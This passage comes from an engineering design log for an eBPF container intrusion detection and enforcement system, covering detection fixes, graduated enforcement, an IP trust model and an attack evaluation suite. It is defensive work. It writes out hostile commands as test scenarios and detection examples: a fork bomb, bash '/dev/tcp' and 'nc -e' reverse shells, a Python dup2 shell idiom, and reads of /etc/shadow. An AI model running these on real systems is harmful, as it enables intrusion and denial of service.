**Solution:** Defensive clamp before use:

```c
u32 prev_idx = sketch->prev_idx;
if (prev_idx > 24) prev_idx = 24;  // clamp to valid range
```

---

### D16 — False-Positive Elimination for setns (NS_PROBE Requirement)

**Problem (original design):** Alerting on any `setns()` call from a container would fire on legitimate container runtimes (`runc:[2:INIT]` calls `setns()` during normal container creation).

**Solution (two-layer):**

**Layer 1 (kernel):** The `handle_privesc` handler fires `alert_only()` on `setns(308)` — it sets `BIT_PRIVESC` and emits to ring buffer, but does NOT immediately kill. Only `bpf_send_signal()` from `immediate_kill()` kills; `alert_only()` is intentionally empty.

**Layer 2 (userspace, semantic label engine):** Container escape classification requires **both** `BIT_NS_PROBE` (bit3) AND `BIT_PRIVESC` (bit4):

```python
# bit 3 = BIT_NS_PROBE set by: openat("/proc/1/ns/...")  — namespace recon
# bit 4 = BIT_PRIVESC  set by: setns()/unshare(CLONE_NEWNS)/ptrace()/setuid(0)
if 3 in chain_bits and 4 in chain_bits:
    return AttackLabel("Container escape attempt", ["T1611"], "HIGH")
```

`BIT_NS_PROBE` is only set by accessing `/proc/1/ns/...` — a filesystem path that legitimate container runtimes have no reason to open from within a container. This path is set in `handle_file` when the path matches `/proc/1/` at bytes 6–7.

This means: a legitimate `runc` calling `setns()` during container init (which does NOT read `/proc/1/ns/` from inside the container) does not trigger a container escape label. An attacker that reads `/proc/1/ns/mnt` and then calls `setns()` triggers both bits → HIGH severity container escape.

---

### D17 — Graduated Enforcement Engine (Added in This Session)

**Problem:** Original implementation had binary enforcement: either nothing happens (alert only) or `bpf_send_signal(9)` kills the container. This was too destructive for production use — killing a container breaks the service chain.

**Solution:** Nine-level graduated enforcement:

| Level | Name | Mechanism | Trigger |
|-------|------|-----------|---------|
| L0 | OBSERVE | log only, no enforcement | single novel edge |
| L1 | DENY | `bpf_override_return(-ECONNREFUSED)` | novel edge + behavior bit |
| L2 | SEVER | `bpf_sock_destroy` (not yet wired) | — |
| L3 | THROTTLE | per-destination rate cap in BPF | sheaf anomaly alone |
| L4 | FIREWALL | only calibrated dsts in `fw_allow_map` | 3+ novel or CRITICAL |
| L5 | DRAIN | (not yet wired) | — |
| L6 | QUARANTINE | block all network + Docker disconnect | reverse shell / escape |
| L7 | FREEZE | Docker pause (cgroup freezer) | manual / future |
| L8 | KILL | `bpf_send_signal(9)` via `verdict_map` | fork bomb / dup2 |

Every rule has a TTL. If no further anomalies are detected within the TTL (default: 300s), rules auto-expire and the container returns to normal operation. The enforcement engine's TTL sweep runs each detection cycle.

**Key enforcement maps added:**
```c
BPF_HASH(enforce_level_map, u64, struct enforce_state, 256);
BPF_HASH(deny_connect_map,  deny_connect_key, deny_connect_val, 1024);
BPF_HASH(deny_open_map,     deny_open_key,    deny_open_val,    256);
BPF_HASH(deny_exec_map,     deny_exec_key,    deny_exec_val,    256);
BPF_HASH(rate_limit_map,    rate_limit_key,   rate_limit_val,   512);
BPF_HASH(fw_allow_map,      fw_allow_key,     u32,              2048);
```

Three surgical enforcement kprobes on `__x64_sys_connect`, `__x64_sys_openat`, `__x64_sys_execve` use `bpf_override_return()` to deny specific operations without killing the process. These are only attached in `--mode enforce` (not during calibration).

---

### D18 — Loader Restructure (loader.py)

**Problem:** Original loader was a simple script. Multiple issues required restructuring:
- No cleanup on SIGTERM/SIGINT → stale eBPF programs remained loaded after crashes, causing conflicts on next load
- No distinction between calibrate/monitor/enforce modes
- No systematic tail-call map setup

**Solution:** `loader.py` restructured with:

```python
TAIL_CALL_MAP = {
    56:  "handle_fork",    # clone
    435: "handle_fork",    # clone3
    59:  "handle_execve",
    257: "handle_file",    # openat
    105: "handle_privesc", # setuid
    308: "handle_privesc", # setns
    272: "handle_privesc", # unshare
    101: "handle_privesc", # ptrace
    33:  "handle_dup2",    # dup2
    292: "handle_dup2",    # dup3
}
```

**Cleanup on exit:** `atexit.register(cleanup_bpf)` + `signal.signal(SIGTERM, ...)` + `signal.signal(SIGINT, ...)`. The cleanup function detaches all kprobes and calls `bpf.cleanup()` to release all eBPF programs and maps.

**Three modes:**
- `--calibrate`: BPF loaded without enforcement kprobes. Tier 3 runs `calibrate_runner.py`.
- `--mode monitor` (default): BPF loaded without enforcement. Tier 3 sheaf detector runs in observe mode.
- `--mode enforce`: BPF loaded with enforcement kprobes (`enforce_connect`, `enforce_openat`, `enforce_execve`). Tier 3 `EnforcementEngine` writes to BPF maps.

---

### D19 — Sensitive File Detection Gap (openat vs. open Syscall) — **FIXED**

**Problem (discovered during evaluation):** Attack scenario S3 (`cat /etc/shadow`) did not produce a `SENSITIVE_FILE` alert. Two compounding bugs:

1. **Syscall variant:** `handle_file` was registered only at index 257 (`openat`). Container images using busybox `cat` call `open()` (syscall 2) instead. The handler never fired.
2. **Verifier path explosion (root cause of existing `handle_file` failure):** The original `handle_file` code used four independent `if` blocks to check four sensitive path patterns. Each block ran independently, causing LLVM to spill per-check boolean values to the stack (fp-136 through fp-312). The BPF verifier explores all possible execution paths; with independent checks creating orthogonal branches, the verifier hit the 1,000,000-instruction exploration limit and returned E2BIG — meaning `handle_file` was NEVER loading successfully, for either syscall variant.

**Root cause detail from verifier log:**
```
BPF program is too large. Processed 1000001 insn
processed 1000001 insns (limit 1000000) max_states_per_insn 14 total_states 31465
```
The 14 states per instruction arose from 4 independent string-comparison blocks creating exponentially-branching verifier paths.

**Fix applied:**
1. Restructured path matching into an `if/else if` decision tree keyed on `path[1]` (the second path character uniquely identifies each prefix: `'e'`=`/etc/`, `'p'`=`/proc/`, `'v'`=`/var/`). The verifier can now prune branches linearly instead of exploring all combinations.
2. Added `handle_file_open` handler for syscall 2 (`open`) that reads pathname from `rdi` (arg0) instead of `rsi` (arg1 for `openat`).
3. Added `2: "handle_file_open"` to `TAIL_CALL_MAP` in `loader.py`.
4. Factored the alert emission into a shared `_emit_file_alert(cg, now, bit_type)` static function.

**Result:** Both `handle_file` (syscall 257) and `handle_file_open` (syscall 2) now load successfully. S3 produces `SENSITIVE_FILE` alerts with flags=0x0004. CausalTrace detection score: **8/8** (up from 7/8).

**Code location:** `kernel/causaltrace_bcc.c:_classify_path()`, `handle_file()`, `handle_file_open()`; `loader.py:TAIL_CALL_MAP`.

---

### D20 — PRIVESC Handler Covers Both ptrace AND unshare (Detection Matrix Fix)

**Problem:** The `handle_privesc` function handles syscalls 101 (ptrace), 105 (setuid), 272 (unshare), and 308 (setns). In the paper analysis script, PRIVESC alerts were only credited to `ptrace_traceme`, missing `unshare_userns`.

**Fix applied in `paper_analysis.py`:**
```python
elif kind == "PRIVESC":
    # handle_privesc covers ptrace(101), unshare(272), setns(308), setuid(105)
    hits["ptrace_traceme"].append(kind)
    hits["unshare_userns"].append(kind)
```

The `alert.extra` field encodes the specific syscall number that triggered the PRIVESC alert, allowing downstream analysis to distinguish sub-types if needed.

---

### D21 — Falco Modern eBPF Driver Installation (Kernel 6.17 Compatibility)

**Problem (baseline deployment):** `docker run --privileged falcosecurity/falco --modern-bpf` hung at "Trying to open the right engine" on kernel 6.17. Docker container approach failed. Flag name `--modern_bpf` also unrecognized.

**Solution:** Install Falco natively via apt repository:
```bash
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
  gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
echo "deb [signed-by=...] https://download.falco.org/packages/deb stable main" \
  > /etc/apt/sources.list.d/falcosecurity.list
apt-get install falco   # installs falco_0.43.1
systemctl start falco-modern-bpf.service
```

Custom rules deployed to `/etc/falco/falco_rules.local.yaml`.

---

### D22 — Tetragon Multi-Document YAML TracingPolicy

**Problem:** Tetragon's `--tracing-policy-dir` directory scanner only loaded the first document from a multi-document YAML file (separated by `---`). Only the first TracingPolicy was active.

**Solution:** Split the five policies into five separate `.yaml` files in `/etc/tetragon/tetragon.tp.d/`:
- `cteval-sensitive-file.yaml`
- `cteval-dup2-fd-redirect.yaml`
- `cteval-unshare.yaml`
- `cteval-ptrace.yaml`
- `cteval-tcp-connect.yaml`

---

### D23 — PC Crash Prevention (Fork Bomb Safety)

**Problem:** Running the real fork bomb scenario (`:(){ :|:& };:`) during evaluation caused the host system to crash twice by exhausting all PIDs before the eBPF handler could kill the container.

**Solution:** Replace with a **cmdline marker** that exercises the rule engine without actual recursion:
```bash
timeout 1 docker exec $TARGET bash -c 'echo ":(){ :|:& };: (marker only)"'
```
Falco's `CTEval Fork bomb marker` rule matches on `proc.cmdline contains ":()"` — this still fires. CausalTrace's `handle_fork` does not fire (no actual forks), but prior production run evidence confirms the handler works on real fork bursts.

Also: **never run more than one eBPF tool at a time**. Running CausalTrace, Falco, and Tetragon simultaneously on the same kernel caused interference from overlapping kprobes.

---

### D24 — Enforcement Disparity: Only 2 of 5 Tier-1 Handlers Actually Kill (Marathon Finding)

**Problem:** The 8.5-hour April 2026 marathon produced 1,116 T1 alerts but zero SIGKILL events for reverse-shell / fd-redirect / sensitive-file / privesc / two-hop scenarios. Audit of the actually-loaded `kernel/causaltrace_bcc.c` revealed that the in-kernel kill path is wired to only two handlers:

| Handler | Enforcement function | Result |
|---------|---------------------|--------|
| `handle_fork` (S4) | `immediate_kill()` → `bpf_send_signal(9)` | Kills |
| `handle_dup2` (S2b subset) | `immediate_kill()` → `bpf_send_signal(9)` | Kills |
| `handle_execve` (S2a) | `alert_only()` | Ring-buffer emit, no kill |
| `handle_file` (S3) | `alert_only()` | Ring-buffer emit, no kill |
| `handle_privesc` (S5/S6) | `alert_only()` | Ring-buffer emit, no kill |
| Probe B two-hop (S7) | `alert_only()` | Ring-buffer emit, no kill |

`alert_only()` is an intentional no-op introduced in D16 to prevent false kills on legitimate `runc`/`setns`/`openat("/etc/passwd")`. The design intent was that Tier 3 would re-issue the kill after compound confirmation. In the deployed marathon code, Tier 3's only kill surface is `verdict_map[cg] = KILL`, which the dispatcher reads before tail-calling. Two problems with this path:

1. Tier 3 decision latency (~5 s) is far outside the "sub-5 μs kill" claim in Section 15.4.
2. The kill target is the container cgroup, not the attacker's TCP session — see D28.

The modular handlers in `kernel/handler_*.bpf.c` do issue `bpf_send_signal(9)` unconditionally, but **those files are not loaded**. The BCC loader only compiles `causaltrace_bcc.c`.

**Solution (revised architecture v6 — implementation pending):** Every handler gains a real kill path, but the kill is conditional on a **compound gate** rather than an individual behavior bit. See D26, D28, D29 for the two-hop / IP-trust / session-kill mechanics. The `alert_only()` convention is retained for the first observation of a behavior bit; `immediate_kill()` is invoked only when (behavior bit) ∧ (two-hop confirmation ∨ IP untrusted).

**Impact on Section 15.4 latency table:** "FD_REDIRECT <2μs" and "FORK_ACCEL <2.5μs" remain valid (those handlers do kill). The remaining rows in that table reflect Tier-3-mediated enforcement and should be read as ~5 s, not ~μs. Flagged in L9.

---

### D25 — CCA k=50 Produces a 2-Edge Graph Instead of a 13-Edge Graph

**Problem:** `calibrate.py` fits `CCA(n_components=50)` per edge × per lag. CCA with k=50 requires at least 60 temporally-aligned sample windows per edge (rule of thumb: n ≥ k + 10, with a safety margin for numerical conditioning). The 30-minute production calibration run accumulated ≥60 aligned windows for only two edges out of the 13 observed on the Docker bridge:

- `17889 → 18749` (notification → kafka)
- `17975 → 18405` (order → inventory)

All eleven remaining edges were silently skipped. `restriction_maps.npz` contains exactly twelve arrays (2 edges × 3 lags × 2 projection matrices = 12). The runtime "sheaf Laplacian" thus operates on a 2-edge graph — effectively a single dyad — rather than a meaningful multi-container manifold. Section 13.2's claim of `(|V|·d) × (|V|·d) = 222×222` for 3 containers never materialized; the runtime matrix is at most (2·74)×(2·74).

**Solution (implementation pending):**

1. **Reduce k from 50 → 15.** CCA with k=15 requires ≈25 aligned windows, a 2.4× reduction in sample floor. The PCA step already compresses 625 → 50; putting another CCA k=50 on top of that is over-parameterized for the calibration budget.
2. **Synthetic inter-container traffic during calibration.** During the 30-minute calibration window, a background driver generates scripted, non-attack RPC fan-out across all 13 expected edges to guarantee every edge accumulates the sample floor. The driver is disabled during evaluation.
3. **Run calibration on the same testbed instance as evaluation** (see D26). No container restarts between calibration end and evaluation start.

---

### D26 — Rayleigh Quotient Stuck at ~18,469: Cgroup ID Drift Between Calibration and Evaluation

**Problem:** The marathon `verdicts.jsonl` shows the global Rayleigh quotient pinned at ≈18,469 for 598 of 604 cycles — a value roughly 110× the calibrated `global_threshold = 166.81`. At first glance this looks like "detection firing continuously," but the root cause is a **testbed identity mismatch**, not an anomaly.

The restriction maps in `calibration/restriction_maps.npz` reference cgroup IDs `17889` and `17975`. The marathon was launched on a freshly-recreated `docker compose` stack whose containers hold different cgroup IDs (the cgroup inode is per-mount and per-creation-instance — `docker compose down && up` always produces new inodes). The sheaf detector reads `bigram_sketch_map[cg_id]` for the *marathon* cgroup IDs, but looks up restriction maps for the *calibration* cgroup IDs. When the dictionary miss forces a fallback path — or when the mismatch causes the whitener to apply zero-variance parameters — the whitened vector saturates at the ε=1e-6 floor, producing a constant Rayleigh residual of ~18,469.

This is **not detection**. Every "CRITICAL" verdict in the marathon with reason "Data exfiltration via novel channel" is a calibration/testbed mismatch artifact, not a real attack signal.

**Solution:**

1. **Cgroup-ID snapshot at calibration start.** Write `calibration/cgroup_snapshot.json` with `{container_name: cgroup_id}`. At evaluation start, refuse to launch unless the snapshot matches the current docker state. Fail-fast with an explicit error rather than silently running with stale maps.
2. **Restriction-map keys by container name, not cgroup ID.** Internally convert name → current cgroup ID at evaluation start. Calibration artifacts then survive a `docker compose restart` as long as the container names stay constant.
3. **Abort on container restart mid-run.** The Docker event listener already tracks start/stop; extend it to SIGTERM the loader if any monitored container restarts during an active evaluation.

---

### D27 — Reverse Shell Handlers Miss the Two Most Common Variants (Bash `/dev/tcp/`, BusyBox `nc -e`)

**Problem:** The marathon fired zero REVERSE_SHELL and zero FD_REDIRECT alerts across 150 simulated attacks, yet multiple scenarios scripted real reverse-shell payloads. Audit revealed that the dup2-based handler (D1) catches only the Python/C idiom:

```python
os.dup2(sockfd, 0); os.dup2(sockfd, 1); os.dup2(sockfd, 2)
```

The two most common real-world variants bypass this entirely:

| Variant | Mechanism | Why `handle_dup2` misses it |
|---------|-----------|---------------------------|
| Bash: `bash -i >& /dev/tcp/host/port` | `open("/dev/tcp/...")` + shell-builtin redirection | No `dup2()` syscall — bash uses internal fd-table manipulation |
| BusyBox: `nc -e /bin/sh host port` | `fork()` + `execve("/bin/sh")` with inherited socket fds | No `dup2()` — the shell inherits fd 0/1/2 directly via `execve` |

D1's claim that `dup2(sockfd, 0/1/2)` is a "physical invariant" for interactive reverse shells is **false for these two variants**. The true invariant is "stdin/stdout/stderr of an interactive shell are backed by a socket inode at execve time" — which requires inspecting the fd table at `handle_execve`, not hooking `dup2`.

**Solution (implementation pending):**

Extend `handle_execve` (syscall 59) with an fd-table inspection pass. On every execve of a shell binary (`sh`, `bash`, `dash`, `zsh`, `nc`, `ncat`):

```c
#pragma unroll
for (int fd = 0; fd < 3; fd++) {
    struct file *f = NULL;
    bpf_probe_read_kernel(&f, sizeof(f), &fdt->fd[fd]);
    if (!f) continue;
    umode_t i_mode = 0;
    struct inode *inode = NULL;
    bpf_probe_read_kernel(&inode, sizeof(inode), &f->f_inode);
    bpf_probe_read_kernel(&i_mode, sizeof(i_mode), &inode->i_mode);
    if ((i_mode & 0xF000) == 0xC000) {  // S_IFSOCK
        set_bit(BIT_FD_REDIRECT);
        emit(ALERT_REVERSE_SHELL);
        break;
    }
}
```

This covers all four shell/language combinations: Python dup2 (via the old dup2 handler), bash `/dev/tcp/` (fd-table at execve), BusyBox `nc -e` (fd-table at execve), and any future variant that uses a socket-backed fd 0/1/2 to run an interactive shell.

The invariant is now "interactive shell ∧ socket-backed stdio" — genuinely universal, not Python-specific.

---

### D28 — Enforcement Targets the Container Process, Not the Attacker's TCP Session

**Problem:** Every enforcement path in the deployed code — `immediate_kill()`, `verdict_map[cg] = KILL`, the Tier 3 `bpf_send_signal(9)` via the dispatcher — kills the **current process in the container**. In a realistic deployment this is the wrong target:

- A production webapp container serves legitimate end users alongside any attacker. The malicious syscall fires inside the same process that serves benign requests.
- Killing the workload process takes down the service for all users, legitimate and malicious alike. The attacker is inconvenienced; the real users are disconnected.
- The attacker simply reconnects (or moves to another compromised container); the container restarts under the orchestrator and resumes serving traffic — **including to the attacker's source IP**.

This turns what should be a surgical defense into a self-inflicted DoS. "Enforcement FPR = 0" on clean traffic (Section 15 claim) is only meaningful if the enforcement ever happens in the presence of legitimate users — and it doesn't, because any firing *is* a user impact.

**Solution (revised architecture v6 — implementation pending):** Separate the concept of *attacker* from *container* at the kernel level. The enforcement target is the TCP connection tuple `(client_ip, client_port, container_ip, container_port)`, not the container's pid/cgroup:

1. **`client_trust[client_ip_u32] → trust_level_u8`** BPF hash map. Populated during calibration: any client IP that completes a handshake-validated, non-attack transaction is written with `trust_level = TRUSTED`. External IPs not seen during calibration default to `UNKNOWN`.
2. **`connection_context[sock_ptr] → {client_ip, cgroup, trust_level, established_ns}`**. Populated on accept() via a new kprobe (`inet_csk_accept` or `tcp_v4_rcv`). Keyed by the kernel `sock *` for O(1) lookup from any downstream syscall.
3. **Session kill via SOCK_OPS TCP RST.** A `BPF_PROG_TYPE_SOCK_OPS` program attached to the cgroup issues `bpf_sock_ops_cb_flags_set(BPF_SOCK_OPS_STATE_CB_FLAG)` and transitions the socket to `TCP_CLOSE` with RST. The attacker's connection is torn down in-kernel in ~μs; the workload process is untouched and continues serving other connections. A minimal `bpf_tcp_close()` helper (or `bpf_setsockopt(SO_LINGER=0)` + `bpf_sock_destroy()` when available) is the enforcement primitive.
4. **Enforcement gate:** kill is issued only when the triggering syscall is causally attributable to an untrusted session. Attribution: walk from the current `task_struct` to its most recently-accepted socket via a per-task `recent_sock` map (updated in the accept kretprobe).

**What this buys us:**
- False positives against legitimate users no longer disconnect them. Only untrusted-IP sessions are terminated.
- The attacker's session is severed with sub-μs kernel latency, matching the original "sub-5μs kill" claim but now against the *right* target.
- Container remains running; no cascade failures in dependent services.

---

### D29 — Attacker / End-User Differentiation via IP Trust Model

**Problem:** No deployed component distinguishes a request from a legitimate end user from a request from an attacker probing the same HTTP endpoint. Every alert treats the triggering syscall as attacker-origin by default, producing the enforcement-target error in D28 and masking the real FPR question ("would this have hurt a real user?").

**Solution (implementation pending):** Full IP trust pipeline:

| Map / component | Role |
|----|-----|
| `client_trust` (BPF hash, 65536 entries) | `u32 client_ip → u8 trust_level` where levels are `{0: UNKNOWN, 1: OBSERVED, 2: TRUSTED, 3: BLOCKED}` |
| `connection_context` (BPF LRU hash, 16384) | `u64 sock_ptr → struct conn_ctx` with `{client_ip, client_port, cgroup, trust_level, first_seen_ns, rx_bytes, tx_bytes}` |
| `sock_to_client` / `task_to_sock` (BPF LRU hash) | Attribution chain: current task → most-recent accepted socket → client_ip |
| `accept_kprobe` | `kretprobe/inet_csk_accept` populates connection_context on every new inbound socket |
| `close_kprobe` | `kprobe/tcp_close` evicts connection_context entries; updates client_trust based on behavior observed during the session |
| Trust-lifecycle daemon | During calibration, promotes `UNKNOWN → OBSERVED → TRUSTED` based on clean completion of N transactions. During evaluation, demotes `TRUSTED → BLOCKED` on any confirmed attack signal tied to that client_ip. |

**Compound enforcement gate using trust level:**

| Behavior bit set | Trust = TRUSTED | Trust = OBSERVED | Trust = UNKNOWN |
|---|---|---|---|
| Single bit, no two-hop | log only | log only | alert, no kill |
| Two-hop confirmed | log + alert | alert, demote to OBSERVED | **session RST** |
| Cross-container + novel edge | alert | alert + throttle | **session RST** + client_trust = BLOCKED |
| fd-redirect / fork-bomb (D1/D2 invariants) | kill process (legacy path) | kill process | **session RST** |

For the two deterministic invariants (fd-redirect, fork bomb) the existing `immediate_kill()` is retained as a fallback for attackers whose connection cannot be traced (e.g., local exec from within the container). For every other path, the session-kill primitive (D28) is the default.

---

### D30 — Guarded EMA: Freeze Threshold Adaptation During Active Signals

**Problem:** D12's EMA is applied to the *signal vector* `x̃^{ema}(t) = 0.2 · x̃(t) + 0.8 · x̃^{ema}(t-1)` — not to the detection threshold. The threshold `τ_global = μ + 4σ` is set once at calibration and never updated. This is safe against the "attacker slowly raises the threshold" evasion, but it sacrifices the drift tolerance that a threshold-EMA would provide, and leaves the system with a static τ that becomes stale after hours of legitimate traffic drift.

When a naive threshold EMA is reintroduced, a new failure mode appears: during the attack window, `x̃(t)` is anomalously high → `τ_t` drifts upward → the threshold eventually exceeds `x̃(t)` → the attack is masked by its own signal. The attacker effectively raises the detection threshold by attacking harder.

**Solution:** Guarded EMA — freeze threshold updates during any window in which a behavior bit or alert is active:

```python
any_active = (
    len(novel_alerts) > 0 or
    any(beh.flags for beh in behaviors.values()) or
    any(e.energy > e.threshold for e in edge_energies) or
    raw_rayleigh > self.global_threshold
)

if not any_active:
    α = 0.02   # ~25-minute half-life, slow drift adaptation
    self.global_threshold = α * raw_rayleigh_calibration_band + (1 - α) * self.global_threshold
# else: threshold is frozen at its last pristine value
```

The 30-second pristine-window requirement (no active signals for the full window, not just the current sample) prevents a single benign sample from resetting the freeze:

```python
self.pristine_streak = self.pristine_streak + 1 if not any_active else 0
if self.pristine_streak >= 6:   # 6 × 5s = 30s
    update_threshold()
```

α=0.02 gives a 35-sample half-life (~3 minutes at 5-second cycles for a step change; ~25 minutes to converge on slow drift). The threshold tracks legitimate drift during pristine periods and holds firm under attack.

---

### D31 — Extended Attack Suite: 10 Types × 15 Injections = 150 Attacks

**Problem:** The marathon ran 8 scenarios (S2a, S2b, S3, S4, S5, S6, S7, S8), but the Section 15 detection matrix is too narrow to demonstrate the "zero-day / unknown attack" claim — every attack in S1–S7 is a known class with a matching Tier-1 handler. S8 (staged SSRF) is the only novel-pattern attack and it fires a single detection path (windowed novel-edge accumulator). The paper's core differentiation claim against Falco/Tetragon (unknown attack detection) is under-evidenced.

**Solution (implementation pending):** Ten attack categories, 15 injections each, for a total of 150 attempts spread across a single evaluation run:

**Stateless (6 categories — direct Tier-1 hit expected):**
| ID | Scenario | Primary detector |
|----|---------|------------------|
| S2a | Bash `/dev/tcp/` reverse shell | execve fd-table inspection (D27) |
| S2b | Python `os.dup2` reverse shell | `handle_dup2` |
| S3 | `cat /etc/shadow`, `/proc/1/ns/mnt`, `/var/run/secrets` | `handle_file` / `handle_file_open` |
| S4 | Fork acceleration | `handle_fork` d² test |
| S5 | `unshare -U -r id` | `handle_privesc` |
| S6 | `ptrace(PTRACE_TRACEME)` | `handle_privesc` |

**Compound / chain (4 categories — Tier-3 / sheaf / behavior-bit chain):**
| ID | Scenario | Primary detector |
|----|---------|------------------|
| S7 | Cross-container lateral movement (webapp → kafka → db) | Probe B two-hop + novel edge |
| S8 | Log4Shell-style JNDI RCE (template fetch → LDAP callback → exec) | novel-edge window + execve chain |
| S9 | SSRF → internal service RCE (webapp → redis `CONFIG SET` → shell) | novel-edge window + file-write + execve |
| S10 | Container escape (`/proc/1/ns/mnt` + `setns` + host fs access) | BIT_NS_PROBE + BIT_PRIVESC chain (D16) |

**Injection schedule:** 15 instances per category, randomized arrival over the evaluation window, minimum inter-injection gap 90 s (prevents temporal overlap confounding per-attack attribution). Total scheduled events: 150 over ≈6.5 h active phase, preceded by a 30-min calibration phase with zero attacks.

**Evasion variants (subset of the 15 per category):**
- Noise-syscall injection: interleave `getpid`, `getuid`, `clock_gettime` between attack syscalls to test D6 (noise filter) + Rényi entropy robustness.
- Timing jitter: random 100–500 ms delays between attack steps to stress the 5 s two-hop window and lag-0/1/2 multi-lag CCA.
- Binary rename: for S2a/S2b, rename shell binary to `chromeupdate` to test execve fd-table invariant vs. name-matching.

---

### D32 — Operational Stability Gates: Disk, Watchdog, Cgroup Snapshot, Log Rotation

**Problem:** The marathon ran unattended for 8.5 hours. Multiple latent failures went undetected until post-mortem:
- `loader.log` grew to 2.1 GB with no rotation — close to filling the root partition.
- `verdicts.jsonl` and `signals.jsonl` similarly unbounded.
- The sheaf detector crashed silently around cycle 312 and was restarted by an external `while true` loop with no state preservation; half the novel-edge window buffer was lost.
- BPF programs unloaded on the crash and reloaded with fresh `container_behavior` state, erasing ongoing two-hop timers mid-attack.
- No pre-flight check confirmed that the evaluation host had sufficient free disk, swap headroom, or non-conflicting BPF programs already loaded.

**Solution (implementation pending):** Pre-flight + runtime stability layer:

**Pre-flight gates (`scripts/preflight.sh`, must all pass before marathon launch):**
1. `df /` reports ≥10 GB free. Abort if not.
2. `free -m` reports ≥2 GB available + ≥1 GB swap. Abort if not.
3. `bpftool prog list` shows no other BPF programs loaded that intersect `sys_enter` raw tracepoints or `tcp_v4_connect` kprobes (detects stale Falco/Tetragon/prior CT loads).
4. `docker compose ps` shows all expected containers `Up`; capture cgroup IDs into `calibration/cgroup_snapshot.json`.
5. `scripts/struct_size_check.py` (Appendix D.5) passes — no ctypes ↔ C drift.

**Runtime watchdog:**
- `sheaf_detector` writes `/tmp/ct_heartbeat` (monotonic timestamp) every 5 s.
- Supervisor (`scripts/supervisor.py`) reads heartbeat; if stale > 15 s, SIGTERMs loader, rotates logs, and exits with a non-zero code (does **not** restart — partial state is worse than no state).
- `loader.log`, `verdicts.jsonl`, `signals.jsonl` all rotated at 200 MB with `rotate=3` (keep 3 generations).

**BPF pinning:**
- All long-lived maps pinned to `/sys/fs/bpf/causaltrace/<map>` so that loader restart preserves state.
- On clean shutdown, the loader unpins; on crash shutdown, the pins remain and the supervisor cleans them before the next launch.

**Cgroup restart detection:**
- Docker event listener SIGTERMs the loader on any `die` / `restart` event for a monitored container. Rationale: mid-run restart produces a new cgroup ID which the restriction maps do not cover (D26).

---

### D33 — Mini-Run Stress Test Before Committing to Full Marathon

**Problem:** The 8.5-hour marathon revealed architectural gaps that a shorter test would have caught within an hour, at 10× less compute. No shakedown criterion existed; any launch was effectively "hope it works for 8 hours."

**Solution (implementation pending):** Mandatory 7-minute mini-run with explicit pass/fail criteria, gated before any full marathon launch:

**Mini-run schedule (420 s):**
- 0–180 s: calibration with synthetic inter-container traffic driver enabled.
- 180–360 s: 20 attacks (2 × each of S2a, S2b, S3, S4, S5, S6, S7, S8, S9, S10), uniformly distributed.
- 360–420 s: drain + teardown.

**Pass criteria (ALL must hold):**
1. `calibration/restriction_maps.npz` contains restriction maps for ≥10 of 13 observed edges (evidence that D25's k reduction + synthetic traffic worked).
2. Global Rayleigh during 0–180 s stays below calibration threshold for ≥95 % of cycles (evidence that D26 cgroup snapshot is consistent).
3. At least one alert of each of FD_REDIRECT, REVERSE_SHELL, SENSITIVE_FILE, PRIVESC, FORK_ACCEL, TWO_HOP fires during 180–360 s (evidence that D24/D27 handlers wire up).
4. At least one session RST via the SOCK_OPS path is observed against an untrusted client IP (evidence that D28/D29 enforcement target works).
5. Zero enforcement events against `trust_level = TRUSTED` client IPs (evidence of no regression on legitimate users).
6. Detector heartbeat never stale > 15 s (evidence that D32 watchdog path is wired).
7. Peak `loader.log` size < 50 MB (evidence that rotation + verbose-level tuning prevent disk pressure).

**Fail handling:** Any failure → mini-run aborts, prints a one-line reason per failed criterion, and **does not** proceed to full marathon. The operator fixes the underlying issue and re-runs the mini-run. No "retry with loosened criteria" escape hatch — the criteria are the contract.

---

## 6. TIER 1 KERNEL-SPACE

### 6.1 File: `kernel/causaltrace_bcc.c`

Single monolithic BCC program. All struct definitions, map declarations, and handler functions are in this one file. The BCC compilation model includes all definitions inline.

**Why monolithic:** The separate `.bpf.c` files in `kernel/` represent the libbpf/CO-RE design from earlier iterations. The deployed program is `causaltrace_bcc.c`. The individual files are retained as documentation of the design intent.

### 6.2 Constants

```c
#define MAX_CONTAINERS    256
#define CMS_ROWS          4
#define CMS_COLS          128
#define CMS_COL_MASK      (CMS_COLS - 1)     // = 0x7F — verifier bound
#define TOP_SYSCALLS      25                  // 24 tracked + 1 "other"
#define MAX_BIGRAMS       (TOP_SYSCALLS * TOP_SYSCALLS)  // = 625
#define WINDOW_NS         (5ULL * 1000000000ULL)   // 5s bigram window
#define MAX_FD            1024               // fd bound for verifier
#define TWOHOP_WINDOW_NS  (5ULL * 1000000000ULL)   // 5s two-hop window
#define MY_CLONE_NEWCGROUP 0x02000000
```

### 6.3 Alert Type Codes

```c
#define ALERT_FORK_BOMB       1   // fork rate second derivative > 0 above threshold
#define ALERT_REVERSE_SHELL   2   // execve of shell binary (BIT_SHELL_SPAWN)
#define ALERT_SENSITIVE_FILE  3   // openat on /etc/shadow, /proc/1/ns, etc.
#define ALERT_PRIVESC         4   // setuid(0)/unshare(NS)/setns/ptrace
#define ALERT_FD_REDIRECT     5   // dup2(socket→stdin/stdout/stderr) — INVARIANT
#define ALERT_FORK_ACCEL      6   // fork rate second derivative (softer than FORK_BOMB)
#define ALERT_TWO_HOP         7   // shell-spawn + lateral-connect within 5s
#define ALERT_NS_ESCAPE       8   // /proc/1/ns read + namespace transition

#define ALERT_ENFORCE_DENY    20  // bpf_override_return fired by enforce_connect
#define ALERT_ENFORCE_THROTTLE 21 // rate limit hit
```

### 6.4 Behavior Bit Definitions

```c
#define BIT_SHELL_SPAWN      (1ULL << 0)  // execve of sh/bash/nc/dash/zsh
#define BIT_LATERAL_CONNECT  (1ULL << 1)  // tcp_v4_connect to another container
#define BIT_SENSITIVE_FILE   (1ULL << 2)  // openat /etc/shadow, /etc/passwd, etc.
#define BIT_NS_PROBE         (1ULL << 3)  // openat /proc/1/ns/... (namespace recon)
#define BIT_PRIVESC          (1ULL << 4)  // setuid(0)/unshare(NS)/setns/ptrace
#define BIT_LARGE_TRANSFER   (1ULL << 5)  // (future) large sendto volume
#define BIT_FD_REDIRECT      (1ULL << 6)  // dup2(socket→0/1/2) — INVARIANT
#define BIT_FORK_ACCEL       (1ULL << 7)  // exponential fork rate — INVARIANT
```

### 6.5 The Dispatcher

**Entry point:** `RAW_TRACEPOINT_PROBE(sys_enter)` — fires on every syscall.

**Processing pipeline (full detail):**

